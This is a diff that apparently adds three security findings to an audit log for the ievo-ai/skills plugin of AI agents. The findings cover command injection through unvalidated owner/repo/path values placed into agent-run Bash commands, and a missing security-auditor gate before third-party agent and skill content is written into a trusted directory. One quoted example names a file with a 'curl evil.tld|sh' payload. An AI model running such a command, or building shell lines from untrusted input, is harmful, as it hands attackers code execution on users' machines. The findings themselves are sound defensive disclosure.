@@ -1433,3 +1433,60 @@ location: plugins/ievo/commands/update.md:34-46 (Step 2 refresh-and-overwrite), 
 `/ievo:init`'s install pipeline gates every vendored agent/skill behind a `security-auditor` scan at first install — a point-in-time trust decision. If the same upstream `source.repo`/`source.path` is later compromised (maintainer account takeover, malicious commit merged into an otherwise-trusted repo — a threat class `security-auditor.md` itself names), `/ievo:update`'s Step 2 re-fetches and overwrites the local copy with **no diff shown, no re-dispatch of security-auditor, no confirmation gate of any kind**, then Step 3 re-injects the trust-signaling overlay marker into the new content, and the file's own Rules section (line 117) explicitly instructs restoring `chmod +x` on any newly-fetched `.sh`/`.py` scripts. The design is stated plainly at line 114: "No Opus replay... Refresh-from-upstream is just file copy + marker re-injection" — confirming no compensating re-audit exists. Full exploit chain, preconditions, and recommendation: see issue body.
 
 ---
+
+## S-2026-07-09-001 — evo/SKILL.md interpolates unvalidated `<owner>/<repo>/<path>` into a `gh api` Bash call during vendor-fetch
+
+```yaml
+id: S-2026-07-09-001
+discovered_at: 2026-07-09T10:09:26Z
+run_id: 29009412533
+target_repo: ievo-ai/skills
+title: evo/SKILL.md Step 2 (vendor-if-needed) instructs `gh api repos/<owner>/<repo>/contents/<path>` with no owner/repo/path validation, reproducing the exact CWE-78 command-injection pattern already fixed in security-check/SKILL.md (#347) and inspect/SKILL.md (#348) at a call site those fixes didn't cover
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/355
+cwe: CWE-78
+confidence: high
+location: plugins/ievo/skills/evo/SKILL.md:121 (Step 2 — "Use `gh api repos/<owner>/<repo>/contents/<path>` for fetching source")
+```
+
+Confirmed by direct re-read of the file: unlike `security-check/SKILL.md`'s "How to fetch files" subsection (added in v0.50.4/#347) and `inspect/SKILL.md`'s ref/path allowlist (added in v0.50.3/#348), `evo/SKILL.md` Step 2 has zero validation instruction anywhere in the file (`grep -i "valid\|sanitiz\|allowlist\|regex"` returns nothing relevant) before it tells the agent to build `gh api repos/<owner>/<repo>/contents/<path>` and execute it via Bash. The `<owner>/<repo>/<path>` values originate from a target agent/skill bundled inside an already-installed third-party plugin — attacker-controlled by the same trust model `security-check/SKILL.md`'s own fix rationale describes ("a git tree entry's path can contain almost any byte ... a malicious candidate can name a file `` `curl evil.tld|sh` ``"). Full exploit chain, preconditions, and recommendation: see issue body (mirrors the #347/#348 fix — apply security-check's clone+Glob+Read protocol here instead of per-file `gh api`).
+
+---
+
+## S-2026-07-09-002 — index-repos/SKILL.md interpolates unvalidated `<owner>/<repo>` into a Bash `node scan_repo.mjs` invocation
+
+```yaml
+id: S-2026-07-09-002
+discovered_at: 2026-07-09T10:09:26Z
+run_id: 29009412533
+target_repo: ievo-ai/skills
+title: index-repos/SKILL.md Step 2 (per-repo invocation) builds `node scripts/scan_repo.mjs <owner>/<repo> ...` as a literal Bash command with no owner/repo allowlist check, despite scan_repo.mjs's own OWNER_REPO_RE existing precisely to gate this input
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/356
+cwe: CWE-78
+confidence: high
+location: plugins/ievo/skills/index-repos/SKILL.md:49-56 (Step 2 — "Per-repo invocation")
+```
+
+Confirmed by direct re-read of the file: the `<owner>/<repo>` value (sourced from `discover.mjs`'s `candidates[].source_repo`, itself populated from the public, externally-writable skills.sh API / Codex marketplace catalog — not a value the user typed) is substituted directly into a fenced ` ```bash ` block (`node "${CLAUDE_PLUGIN_ROOT}/scripts/scan_repo.mjs" <owner>/<repo> --output-dir ... --checkout-dir ...`) with no preceding validation step anywhere in the file. `scan_repo.mjs` itself already defines and enforces an `OWNER_REPO_RE` allowlist internally (the CWE-22 fix from v0.49.3), but that only protects paths the script constructs *after* the string reaches it — it does not stop the initial shell line in this SKILL.md from being built with an unvalidated value first, so a crafted `<owner>/<repo>` containing shell metacharacters (e.g. backtick or `$()`) executes at the moment this Bash command line is written, before `scan_repo.mjs` ever runs. This is the same call-site pattern already fixed in `security-check/SKILL.md` (#347) and `inspect/SKILL.md` (#348) — index-repos/SKILL.md was not covered by either fix. Full exploit chain, preconditions, and recommendation: see issue body.
+
+---
+
+## S-2026-07-09-003 — `evolution.md` Step 2 vendors plugin agent/skill content with zero `security-auditor` re-audit gate
+
+```yaml
+id: S-2026-07-09-003
+discovered_at: 2026-07-09T10:09:26Z
+run_id: 29009412533
+target_repo: ievo-ai/skills
+title: agents/evolution.md Step 2 fetches an installed-but-not-yet-vendored plugin's agent/skill content via gh api and writes it straight into the project's trusted .claude/agents or .claude/skills directory with no security-auditor dispatch, no verdict check, and no AskUserQuestion gate — unlike commands/update.md Step 2.5, which explicitly re-audits changed content before it's allowed to land on disk
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/357
+cwe: CWE-829
+confidence: high
+location: plugins/ievo/agents/evolution.md:58-67 (Step 2 — "Ensure target file exists locally (vendor if needed)")
+```
+
+Confirmed by direct re-read of the file: Step 2 unconditionally fetches the plugin file's content (`gh api repos/<owner>/<repo>/contents/<path>` for an agent, or the whole tree for a skill) and writes it straight to `.claude/agents/<name>.md` / `.claude/skills/<name>/` — no `security-auditor` dispatch, no verdict check, no `AskUserQuestion` gate anywhere in this step or elsewhere in the file. `commands/update.md`'s Step 2.5 (added in v0.50.1/#349, this repo's own precedent) performs the structurally identical operation — fetch potentially-changed upstream content and decide whether to let it land on disk — and explicitly dispatches `security-auditor` whenever the fetched content differs from what's already local. `evolution.md`'s vendor-if-needed path has no equivalent, despite being the FIRST time a given plugin-bundled agent/skill is copied into the trusted `.claude/` tree (i.e. exactly the "first install" moment `/ievo:init`'s own pipeline treats as security-auditor-mandatory for a freshly-selected candidate). Full exploit chain, preconditions, and recommendation: see issue body (mirrors update.md's own Step 2.5 pattern: dispatch `security-auditor` before the write, require GREEN or explicit user override via `AskUserQuestion` on YELLOW/RED).
+
+---
